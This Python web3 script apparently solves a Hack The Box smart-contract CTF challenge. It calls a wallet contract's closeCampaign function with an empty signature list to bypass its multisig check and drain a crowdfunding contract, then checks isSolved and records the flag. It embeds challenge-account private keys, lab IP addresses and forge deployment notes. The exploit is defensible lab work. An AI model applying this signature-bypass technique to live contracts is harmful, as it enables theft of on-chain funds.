from web3 import Web3
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files
from eth_account import Account
from eth_account.messages import encode_defunct
from eth_utils import keccak

'''
Private key           :  0x77dd6f7077f73f5fa2441882cf480796a9cd5198b0633b87cb837d47d8f46b06
Address               :  0x620922Feb2f7D1898728A9Ec9e7945f986f656FB
Crowdfunding contract :  0xB176D42e9aF0F41913241A12FcEd0eb95456412d
Wallet contract       :  0xA2E2153E89322ce18fE0DC5C1ba586e88dC95AD3
Setup contract        :  0xD8C1cBb8c270C804a17a52c67F3d1C8de00E73F9
'''

x = {
    "PrivateKey":    "0x77dd6f7077f73f5fa2441882cf480796a9cd5198b0633b87cb837d47d8f46b06",
    "Address":       "0x620922Feb2f7D1898728A9Ec9e7945f986f656FB",
    "TargetAddress": "0xB176D42e9aF0F41913241A12FcEd0eb95456412d",
    "WalletAddress": "0xA2E2153E89322ce18fE0DC5C1ba586e88dC95AD3",
    "setupAddress":  "0xD8C1cBb8c270C804a17a52c67F3d1C8de00E73F9"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]
WalletContract = x["WalletAddress"]

#Attack Contract address
#Target2Contract = "0x5D18A6F24D615134a6b6b4c95cE08347c804dF67"

url = 'http://157.245.37.125:31182'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
print(block_number)

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)
block = w3.eth.get_block(block_number)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

install_solc("0.8.18")
signatures = []

'''
compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.8.18")
abi = compiled['Contract.sol:Contract']['abi']
contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
#number = contract_instance2.functions.attack2().call()
#print(number)
number = contract_instance2.functions.closeCampaign(signatures, Address).call()
print(number)
'''

compiled = compile_files(["Campaign.sol"], output_values=["abi"], solc_version="0.8.18")
abi = compiled['Campaign.sol:CouncilWallet']['abi']
contract_instance2 = w3.eth.contract(address=WalletContract, abi=abi)

construct_txn = contract_instance2.functions.closeCampaign(signatures, Address, TargetContract).build_transaction(
	{
		'from': account_from['address'],
		'nonce': w3.eth.get_transaction_count(account_from['address']),
		#'from': Target2Address,
		#'nonce': w3.eth.get_transaction_count(Target2Address),
		'chainId': w3.eth.chain_id,
		#'value' : 1
		#"gasPrice": w3.to_wei(50, 'gwei'),
		#"gas": 21000,
		#"value": w3.to_wei("0", "ether"),
	}
)

tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.18")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')
#HTB{wh0_c0u1d_7h1nk_7h47_y0u_c4n_53nd_4n_3mp7y_1157}


'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0xd44C694e6280032dA55cEF6715aA3d89c1AD4836
Deployed to: 0x855ad55752bCE030B8D8875d671494eE3F51B1e7
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
